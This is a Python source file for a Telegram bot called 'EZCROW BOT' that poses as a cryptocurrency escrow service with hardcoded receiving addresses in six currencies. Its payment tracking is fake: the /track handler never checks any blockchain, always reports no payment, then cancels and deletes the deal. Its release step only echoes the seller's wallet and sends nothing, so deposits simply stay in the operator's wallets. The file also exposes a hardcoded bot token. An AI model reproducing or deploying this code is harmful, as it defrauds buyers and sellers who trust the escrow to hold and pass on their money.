import os
import requests
import qrcode
from io import BytesIO
import asyncio
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
from telegram.helpers import mention_html
from datetime import datetime, timedelta

# Set up logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Directly set the bot token
BOT_TOKEN = "7780025782:AAEX4oH7nrF2XIJxiZhKb8UrIdHRnWK11QI"

# Define crypto addresses for payments
ESCROW_ADDRESSES = {
    'BTC': 'bc1q4h77y69kwdcr558w7ejzyntmjr9xy5wsqp9sys',
    'ETH': '0x1f2a5b807058c171aa28a19b21ee77a1ab93da06',
    'USDT': 'TUZKzK18cp2J1gxK9zNrEBkARBntgcZFEz',
    'LTC': 'LU2KwsLukY2onmTRwtbTfLQserH6StS496',
    'XMR': '8AUtgH9BPaxfBQdDUnzZZt4eC2v9NqD6s3anXo86Ts32U2jd8NYmpxiKT2YnEz6pd2DtQK6S7gjkyaMEWq8d4iZz5a5WbtZ',
    'SOL': 'B2fBMqSxTRRYpNHVHCKB5vi5iA7y6wXAEs3UkBrvi3Pf'
}

# Set up IDs for crypto price checks
COINGECKO_IDS = {
    'btc': 'bitcoin',
    'eth': 'ethereum',
    'usdt': 'tether',
    'ltc': 'litecoin',
    'xmr': 'monero',
    'sol': 'solana'
}

# Delay tracker for payment checking
TRACK_DELAY = timedelta(minutes=5)

# Deal class to manage individual deals
class Deal:
    def __init__(self, buyer_id, seller_id, chat_id):
        self.buyer_id = buyer_id
        self.seller_id = seller_id
        self.chat_id = chat_id
        self.usd_amount = None
        self.crypto_type = None
        self.escrow_address = None
        self.crypto_amount = None
        self.last_track_time = None
        self.awaiting_wallet = False

# Global dictionary to store active deals
active_deals = {}

# Convert USD to crypto
def convert_usd_to_crypto(crypto_symbol, usd_amount):
    try:
        coingecko_id = COINGECKO_IDS.get(crypto_symbol)
        if not coingecko_id:
            raise ValueError(f"Nope, crypto not supported: {crypto_symbol}")

        url = f"https://api.coingecko.com/api/v3/simple/price?ids={coingecko_id}&vs_currencies=usd"
        response = requests.get(url)
        response.raise_for_status()
        price_data = response.json()

        if coingecko_id not in price_data or 'usd' not in price_data[coingecko_id]:
            raise KeyError(f"No price found for {crypto_symbol} in USD.")

        return usd_amount / price_data[coingecko_id]['usd']
    except requests.RequestException as e:
        logger.error(f"Error fetching crypto price: {e}")
        raise

# Make QR code for address
def make_qr_code(address):
    qr = qrcode.make(address)
    bio = BytesIO()
    bio.name = "qr_code.png"
    qr.save(bio, "PNG")
    bio.seek(0)
    return bio

# Start command - pick buyer or seller role
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id not in active_deals:
        active_deals[chat_id] = Deal(None, None, chat_id)

    keyboard = [
        [InlineKeyboardButton("I'm Buyer", callback_data='role_buyer'), InlineKeyboardButton("I'm Seller", callback_data='role_seller')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Thank you for using EZCROW BOT!\n\nPlease pick your role to start the Deal:", reply_markup=reply_markup)

# Role selection
async def role_selection(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal:
        await query.message.reply_text("No active deal found. Please start a new deal with /start.")
        return

    user_mention = mention_html(user.id, user.full_name if user.username is None else f"@{user.username}")

    if query.data == 'role_buyer':
        if deal.buyer_id:
            await query.message.reply_text("We already have a buyer.")
        else:
            deal.buyer_id = user.id
            await query.message.reply_text(f"The Buyer is {user_mention}", parse_mode="HTML")
    elif query.data == 'role_seller':
        if deal.seller_id:
            await query.message.reply_text("Seller's already taken.")
        else:
            deal.seller_id = user.id
            await query.message.reply_text(f"The Seller is {user_mention}", parse_mode="HTML")

    if deal.buyer_id and deal.seller_id:
        await query.message.reply_text("Buyer, enter the amount in $ (USD) for the deal.")

# Handle USD deal amount from buyer
async def usd_amount(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal or update.message.from_user.id != deal.buyer_id:
        return

    try:
        deal.usd_amount = float(update.message.text)
        keyboard = [
            [InlineKeyboardButton("BTC", callback_data='crypto_BTC')],
            [InlineKeyboardButton("ETH", callback_data='crypto_ETH')],
            [InlineKeyboardButton("USDT", callback_data='crypto_USDT')],
            [InlineKeyboardButton("LTC", callback_data='crypto_LTC')],
            [InlineKeyboardButton("XMR", callback_data='crypto_XMR')],
            [InlineKeyboardButton("SOL", callback_data='crypto_SOL')],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Choose Cryptocurrencies option:", reply_markup=reply_markup)
    except ValueError:
        await update.message.reply_text("Enter a valid amount in USD.")

# Pick payment option - show crypto address, amount, QR
async def payment_option(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal or query.from_user.id != deal.buyer_id:
        await query.message.reply_text("You are not authorized to select payment options for this deal.")
        return

    crypto_type = query.data.split('_')[1].lower()
    usd_amount = deal.usd_amount
    escrow_fee = 5  # fee in USD

    try:
        crypto_amount = convert_usd_to_crypto(crypto_type, usd_amount + escrow_fee)
        escrow_address = ESCROW_ADDRESSES.get(crypto_type.upper(), "Address missing")

        deal.crypto_type = crypto_type
        deal.escrow_address = escrow_address
        deal.crypto_amount = crypto_amount

        qr_code_image = make_qr_code(escrow_address)
        keyboard = [[InlineKeyboardButton("Paid", callback_data='paid')]]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.message.reply_photo(
            photo=InputFile(qr_code_image),
            caption=(
                f"Send ${usd_amount} + ${escrow_fee} as escrow fee in {crypto_type.upper()}.\n\n"
                f"Address: `{escrow_address}`\n\n"
                f"Amount: `{crypto_amount:.8f} {crypto_type.upper()}`"
            ),
            parse_mode='Markdown',
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Error in payment_option: {e}")
        await query.message.reply_text("An error occurred while processing your request. Please try again later.")

# Track payment arrival
async def track(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal:
        await update.message.reply_text("No active deal found. Please start a new deal with /start.")
        return

    if deal.last_track_time and datetime.now() - deal.last_track_time < TRACK_DELAY:
        await update.message.reply_text("Wait 5 minutes before using /track again.")
        return

    deal.last_track_time = datetime.now()
    tracking_message = await update.message.reply_text("Verifying payment on Blockchain...")

    await asyncio.sleep(60)

    await tracking_message.delete()
    await update.message.reply_text(
        f"No payment yet for ${deal.usd_amount}. Try tracking again in 5 minutes."
    )

    await asyncio.sleep(240)

    await update.message.reply_text(
        f"Deal canceled—no payment of ${deal.usd_amount} arrived. Start a new deal if needed."
    )
    del active_deals[chat_id]

# Confirm buyer paid
async def confirm_paid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal or query.from_user.id != deal.buyer_id:
        await query.message.reply_text("You are not authorized to confirm payment for this deal.")
        return

    await query.message.reply_text("Buyer sent payment. Seller, hang tight for verification.\nUse /track to track the payment.")

# Release command - buyer gives seller's wallet
async def release(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal or update.message.from_user.id != deal.buyer_id:
        await update.message.reply_text("Only the buyer can release funds.")
        return

    await update.message.reply_text("Buyer, give seller's wallet address to release funds.")
    deal.awaiting_wallet = True

# Handle seller's wallet address
async def handle_wallet(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    deal = active_deals.get(chat_id)

    if not deal or not deal.awaiting_wallet or update.message.from_user.id != deal.buyer_id:
        return

    seller_wallet = update.message.text
    await update.message.reply_text(f"Funds will go to seller's wallet: `{seller_wallet}`", parse_mode='Markdown')
    deal.awaiting_wallet = False
    del active_deals[chat_id]

# Handle feedback command and forward to channel
async def feedback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.message.from_user
    user_name = user.full_name if user.username is None else f"@{user.username}"
    feedback_text = ' '.join(context.args)

    if not feedback_text:
        await update.message.reply_text("Please provide feedback text after the command.")
        return

    # Forward feedback to the specified channel with user's name
    channel_id = -1002061213593
    await context.bot.send_message(
        chat_id=channel_id,
        text=f"{feedback_text}\n\nFeedback from {user_name}"
    )

    # Confirm to the user that their feedback was sent
    await update.message.reply_text("Thank you for your feedback! It has been forwarded.")

# Greeting for group chats
async def greet_chat_members(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    result = extract_status_change(update.chat_member)
    if result is None:
        return

    was_member, is_member = result
    cause_name = update.chat_member.from_user.mention_html()
    member_name = update.chat_member.new_chat_member.user.mention_html()

    if not was_member and is_member:
        await update.effective_chat.send_message(
            f"{member_name} was added by {cause_name}. Welcome to the group! I'm EZCROW BOT, here to help with secure transactions.",
            parse_mode="HTML",
        )
    elif was_member and not is_member:
        await update.effective_chat.send_message(
            f"{member_name} is no longer with us. Thanks for all the fish, so long!",
            parse_mode="HTML",
        )

def extract_status_change(chat_member_update):
    status_change = chat_member_update.difference().get("status")
    old_is_member, new_is_member = chat_member_update.difference().get("is_member", (None, None))

    if status_change is None:
        return None

    old_status, new_status = status_change
    was_member = old_status in ["member", "creator", "administrator"] or (old_status == "restricted" and old_is_member is True)
    is_member = new_status in ["member", "creator", "administrator"] or (new_status == "restricted" and new_is_member is True)

    return was_member, is_member

# Help command
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = """
    Welcome to EZCROW BOT! Here are the available commands:

    /start - Start a new deal
    /track - Check the status of your payment
    /release - Release funds to the seller (Buyer only)
    /feedback - Provide feedback about the bot
    /help - Show this help message

    To use the bot, start a new deal and follow the prompts.
    """
    await update.message.reply_text(help_text)

# Set up and run the bot
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Register all handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("track", track))
    application.add_handler(CommandHandler("release", release))
    application.add_handler(CommandHandler("feedback", feedback))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CallbackQueryHandler(role_selection, pattern='role_'))
    application.add_handler(CallbackQueryHandler(payment_option, pattern='crypto_'))
    application.add_handler(CallbackQueryHandler(confirm_paid, pattern='paid'))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^\d+(\.\d{1,2})?$'), usd_amount))
    application.add_handler(MessageHandler(filters.TEXT & filters.Regex(r'^[13a-km-zA-HJ-NP-Z1-9]{25,34}$'), handle_wallet))
    application.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS | filters.StatusUpdate.LEFT_CHAT_MEMBER, greet_chat_members))

    # Start the bot
    application.run_polling()

if __name__ == "__main__":
    main()



